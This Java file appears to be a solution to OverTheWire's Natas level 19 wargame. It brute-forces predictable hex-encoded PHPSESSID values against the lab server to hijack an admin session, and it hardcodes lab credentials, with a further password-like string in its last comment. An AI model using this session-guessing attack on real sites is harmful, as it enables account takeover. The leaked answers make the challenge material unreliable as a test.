package com.behnam.natas;

import org.springframework.boot.web.client.RestTemplateBuilder;
import org.springframework.http.*;
import org.springframework.stereotype.Component;
import org.springframework.web.client.RestTemplate;

import java.math.BigInteger;
import java.time.Duration;

@Component
public class Natas19 {
    public void checkSessionId(int sessionId) {
        String sessionIdStr = toHex(sessionId+"-admin");
        System.out.println(sessionId+"----"+sessionIdStr);
        long t0 = System.currentTimeMillis();
        RestTemplateBuilder restTemplateBuilder = new RestTemplateBuilder();
        restTemplateBuilder.setConnectTimeout(Duration.ofMillis(5));
        RestTemplate restTemplate = restTemplateBuilder.build();
        HttpHeaders headers = new HttpHeaders();
        headers.setBasicAuth("natas19", "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs");
        headers.set("cookie","__utma=176859643.63447479.1608145620.1608145620.1608147678.2; __utmz=176859643.1608147678.2.2.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmc=176859643; PHPSESSID="+sessionIdStr);
        headers.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
        HttpEntity<String> entity = new HttpEntity<String>("username=admin&password=admin", headers);
        ResponseEntity<String> result =
                restTemplate.exchange("http://natas19.natas.labs.overthewire.org/index.php",
                        HttpMethod.POST, entity, String.class);
        if (!result.getBody().contains("You are logged in as a regular user. Login as an admin to retrieve credentials for natas20"))
            System.out.println(result.getBody());

    }

    public String toHex(String arg) {
        return String.format("%x", new BigInteger(1, arg.getBytes(/*YOUR_CHARSET?*/)));
    }

    public void solve() {
        String password = "";
        for (int i = 0; i < 640; i++) {
            checkSessionId(i);
        }
    }
}
//eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF